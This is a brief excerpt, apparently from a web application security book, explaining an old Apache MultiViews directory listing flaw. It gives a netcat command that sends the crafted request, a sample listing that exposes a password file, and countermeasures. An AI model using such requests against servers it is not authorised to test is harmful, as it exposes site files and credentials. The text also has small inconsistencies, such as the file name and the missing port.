# Hacking Exposed Web Applications

Multiview, introduced a directory listing vulnerability reported to Bugtra by Kevin from brassscanner.net in July 2001. The attack can be performed directly on the URL with a browser or from the command line using netcat:

```
[roman]$ echo -e "GET /some_directory?M=D HTTP/1.0\n\n" | \
	> nc 192.168.42.80
```

```
<!DOCTYPE HTML PUBLIC "//W3C//DTD HTML 3.2//EN">
<HTML>
<HEAD>
<TITLE>Index of /some_directory/</TITLE>
</HEAD>
<BODY>
<h1>Index of /some_directory/</h1>
<p><img SRC="icons/lastmodified.gif" ALT="">Name</a>
<A href="?M=A">Last modified</a>
<A href="?S=A">Size</a>
<A href="?D=A">Description</a>
<A href="//">Parent Directory</a> -	20-Oct-1998 08:58
<A href="cgi-bin/cgi-bin/"></a> -	28-Oct-1998 05:06
<A href="messages/messages/"></a> -	20-Oct-1998 08:58
<A href="wowboard/wowboard.html"></a> -	16-Apr-1998 19:43	1k
<A href="password.txt"></a> -	16-Apr-1998 19:30	1k
<A href="data.txt">data.txt</a></a> -	16-Apr-1998 19:29	1k
<A href="faq.html">faq.html</a></a> -	16-Apr-1998 19:28	2k
</BODY>
</HTML>
```

The output has been slightly edited for readability, but it is an example of the data to be found within an apache page. We will highlight specific files to look for in Chapter 4. The passwd.txt file should be enough for now. This vulnerability is extremely useful because it provides a complete directory structure and file list for the site.

# Multiview Countermeasures

The first defense is a clean document root. No unnecessary files should be present in any directory. unnecessary files include password files, old data, backup versions of the site, and any file that will never be touched by a browser or by the application. Directory listing vulnerabilities are only threatening when sensitive data can be discovered.

Multiview is enabled in the Options directive between <Directory> tags. It is not enabled by default.